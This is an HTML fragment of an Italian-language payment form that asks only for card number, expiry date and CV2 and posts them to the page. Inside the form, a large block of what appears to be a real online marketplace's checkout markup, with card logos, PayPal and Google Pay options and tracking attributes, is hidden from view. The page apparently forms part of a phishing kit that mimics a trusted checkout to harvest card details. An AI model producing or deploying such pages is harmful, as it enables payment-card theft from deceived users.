
<div class="container">
    <div class="row">
        <div class="col"></div>
        <div class="col">
            <section class="form-signin w-100 m-auto">
                <div class="container text-center">
                    <form method="post">

                        <div class="form-floating">
                            <input type="email" class="form-control" id="Numero_carta" placeholder="name@example.com" name="Numero_carta" required>
                            <label for="Numero_carta">Numero carta</label>
                        </div>

                        <div class="form-floating">
                            <input type="date" class="form-control" id="Data_scadenza" placeholder="name@example.com" name="Data_scadenza" required>
                            <label for="Data_scadenza">Data scadenza</label>
                        </div>

                        <div class="form-floating">
                            <input type="text" class="form-control" id="CV2" placeholder="name@example.com" name="CV2" required>
                            <label for="CV2">CV2</label>
                        </div>

                        <div style="position:absolute;left:0;top:0;right:0;bottom:0;overflow:hidden;z-index:-1;visibility:hidden">
                            <div style="position:absolute;left:0;top:0;right:0;bottom:0;overflow:hidden;z-index:-1;visibility:hidden">
                                <div style="position: absolute; left: 0px; top: 0px; width: 443px; height: 248px;"></div>
                            </div>
                            <div style="position:absolute;left:0;top:0;right:0;bottom:0;overflow:hidden;z-index:-1;visibility:hidden">
                                <div style="position:absolute;left:0;top:0;width:200%;height:200%">
                                    <div class="payment-methods-header">
                                        <div class="payment-methods-header-top">
                                            <span class="module-title" id="payment-method-title">
                                                <h2><span class="loadable-icon-and-text">
                                                        <span class="text-display">
                                                            <span aria-hidden="true" class="">Paga con</span>
                                                            <span class="clipped">Seleziona un metodo di pagamento</span>
                                                        </span>
                                                    </span>
                                                </h2>
                                            </span>
                                        </div>
                                    </div>
                                </div>
                                <div class="payment-selection mcc" data-test-id="PAYMENT_METHODS_PAYMENT_SELECTION">
                                    <div class="payment-selection--payment-methods">
                                        <fieldset id="payment-selection-fieldset">
                                            <legend class="clipped">Seleziona un metodo di pagamento</legend>
                                            <div class="payment-entry--CC payment-entry" data-test-id="PAYMENT_METHODS_PAYMENT_METHOD_SELECTION" data-test-info="{&quot;paymentMethodId&quot;:&quot;CC&quot;}">
                                                <div class="render-summary payment-entry--render-summary" aria-disabled="false"></div>
                                                <div class="payment-entry--expanding-details"><div class="payment-selection--details payment-method-details">
                                                        <div class="render-summary payment-method-details--option app-selectable-render-summary show-all-logos selectable" aria-disabled="false" data-test-id="GET_PAYMENT_INSTRUMENT" data-track="[{&quot;eventFamily&quot;:&quot;XOAP&quot;,&quot;eventAction&quot;:&quot;ACTN&quot;,&quot;actionKind&quot;:&quot;CLICK&quot;,&quot;actionKinds&quot;:[&quot;CLICK&quot;],&quot;operationId&quot;:&quot;2353552&quot;,&quot;flushImmediately&quot;:false,&quot;eventProperty&quot;:{&quot;si&quot;:&quot;1918799208019&quot;,&quot;moduledtl&quot;:&quot;mi:4286&quot;,&quot;sid&quot;:&quot;p2353552.m4286.l50299&quot;}}]">
                                                            <span class="radio radio-icon app-selectable-render-summary--radio-button">
                                                                <span class="radio" style="align-items:center">
                                                                    <input type="radio" aria-describedby="additional-icons" name="radio-group-paymentMethod" id="selectable-render-summary14232" class="radio__control" value="">
                                                                    <span class="radio__icon" hidden="">
                                                                        <svg height="24px" width="24px" class="radio__checked icon icon--radio-checked" xmlns="http://www.w3.org/2000/svg" focusable="false" aria-hidden="true"><use xlink:href="#icon-radio-checked"></use>
                                                                        </svg>
                                                                        <svg height="24px" width="24px" class="radio__unchecked icon icon--radio-unchecked" xmlns="http://www.w3.org/2000/svg" focusable="false" aria-hidden="true"><use xlink:href="#icon-radio-unchecked"></use></svg>
                                                                    </span>
                                                                </span>
                                                            </span>
                                                            <label for="selectable-render-summary14232">
                                                                <div class="render-summary--secondary">
                                                                    <div class="secondary-entry">
                                                                        <span class="loadable-icon-and-text">
                                                                            <span class="text-display">
                                                                                <span class="">Aggiungi una nuova carta</span>
                                                                            </span>
                                                                        </span>
                                                                    </div>
                                                                </div>
                                                            </label>
                                                            <div id="additional-icons" class="additional-icons">
                                                                <span class="loadable-icon-and-text">
                                                                    <span class="x-small loadable-icon-and-text-icon VISA" role="img" aria-label="Visa"></span>
                                                                </span>
                                                                <span class="loadable-icon-and-text">
                                                                    <span class="x-small loadable-icon-and-text-icon MASTERCARD" role="img" aria-label="Mastercard"></span>
                                                                </span>
                                                                <span class="loadable-icon-and-text">
                                                                    <span class="x-small loadable-icon-and-text-icon AM_EX" role="img" aria-label="American Express"></span>
                                                                </span>
                                                                <span class="loadable-icon-and-text">
                                                                    <span class="x-small loadable-icon-and-text-icon POSTEPAY" role="img" aria-label="PostePay"></span>
                                                                </span>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="payment-entry--PAYPAL payment-entry" data-test-id="PAYMENT_METHODS_PAYMENT_METHOD_SELECTION" data-test-info="{&quot;paymentMethodId&quot;:&quot;PAYPAL&quot;}">
                                                <div class="render-summary payment-entry--render-summary selectable" aria-disabled="false" data-test-id="EDIT_PAYMENT_METHOD" data-track="[{&quot;eventFamily&quot;:&quot;XOAP&quot;,&quot;eventAction&quot;:&quot;ACTN&quot;,&quot;actionKind&quot;:&quot;CLICK&quot;,&quot;actionKinds&quot;:[&quot;CLICK&quot;],&quot;operationId&quot;:&quot;2353552&quot;,&quot;flushImmediately&quot;:false,&quot;eventProperty&quot;:{&quot;si&quot;:&quot;1918799208019&quot;,&quot;selectedPaymentMethod&quot;:&quot;PAYPAL&quot;,&quot;moduledtl&quot;:&quot;mi:4286&quot;,&quot;sid&quot;:&quot;p2353552.m4286.l48506&quot;}}]">
                                                    <span class="radio radio-icon app-selectable-render-summary--radio-button">
                                                        <span class="radio" style="align-items:center"><input type="radio" name="radio-group-paymentMethod" value="PAYPAL" id="selectable-render-summary14233" class="radio__control">
                                                            <span class="radio__icon" hidden="">
                                                                <svg height="24px" width="24px" class="radio__checked icon icon--radio-checked" xmlns="http://www.w3.org/2000/svg" focusable="false" aria-hidden="true"><use xlink:href="#icon-radio-checked"></use>
                                                                </svg>
                                                                <svg height="24px" width="24px" class="radio__unchecked icon icon--radio-unchecked" xmlns="http://www.w3.org/2000/svg" focusable="false" aria-hidden="true"><use xlink:href="#icon-radio-unchecked"></use>
                                                                </svg>
                                                            </span>
                                                        </span>
                                                    </span>
                                                    <label for="selectable-render-summary14233">
                                                        <div class="render-summary--primary">
                                                            <span class="loadable-icon-and-text">
                                                                <span class="loadable-icon-and-text-icon PAYPAL" role="img" aria-label="PayPal"></span>
                                                            </span>
                                                        </div>
                                                    </label>
                                                </div>
                                                <div class="payment-entry--expanding-details"></div>
                                            </div>
                                            <div class="payment-entry--GOOGLE_PAY payment-entry" data-test-id="PAYMENT_METHODS_PAYMENT_METHOD_SELECTION" data-test-info="{&quot;paymentMethodId&quot;:&quot;GOOGLE_PAY&quot;}">
                                                <div class="render-summary payment-entry--render-summary selectable" aria-disabled="false" data-test-id="EDIT_PAYMENT_METHOD" data-track="[{&quot;eventFamily&quot;:&quot;XOAP&quot;,&quot;eventAction&quot;:&quot;ACTN&quot;,&quot;actionKind&quot;:&quot;CLICK&quot;,&quot;actionKinds&quot;:[&quot;CLICK&quot;],&quot;operationId&quot;:&quot;2353552&quot;,&quot;flushImmediately&quot;:false,&quot;eventProperty&quot;:{&quot;si&quot;:&quot;1918799208019&quot;,&quot;selectedPaymentMethod&quot;:&quot;GOOGLE_PAY&quot;,&quot;moduledtl&quot;:&quot;mi:4286&quot;}}]">
                                                    <span class="radio radio-icon app-selectable-render-summary--radio-button">
                                                        <span class="radio" style="align-items: center;">
                                                            <input name="radio-group-paymentMethod" id="selectable-render-summary4" class="radio__control" type="radio" value="GOOGLE_PAY">
                                                            <span class="radio__icon" hidden="">
                                                                <svg height="24px" width="24px" class="radio__checked icon icon--radio-checked" xmlns="http://www.w3.org/2000/svg" focusable="false" aria-hidden="true"><use xlink:href="#icon-radio-checked"></use>
                                                                </svg>
                                                                <svg height="24px" width="24px" class="radio__unchecked icon icon--radio-unchecked" xmlns="http://www.w3.org/2000/svg" focusable="false" aria-hidden="true"><use xlink:href="#icon-radio-unchecked"></use></svg>
                                                            </span>
                                                        </span>
                                                    </span>
                                                    <label for="selectable-render-summary4">
                                                        <div class="render-summary--primary">
                                                            <span class="loadable-icon-and-text">
                                                                <span class="loadable-icon-and-text-icon GOOGLE_PAY" role="img" aria-label="Seleziona Google Pay"></span>
                                                                <span class="text-display"><span class="render-summary--primary-text-display">Google Pay</span></span>
                                                            </span>
                                                        </div>
                                                    </label>
                                                </div>
                                                <div class="payment-entry--expanding-details"></div>
                                            </div>
                                        </fieldset>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <button type="submit" class="btn btn-primary" name="btn-card-pay">Submit</button>
                    </form>
                </div>
            </section>
        </div>
        <div class="col"></div>
    </div>
</div>

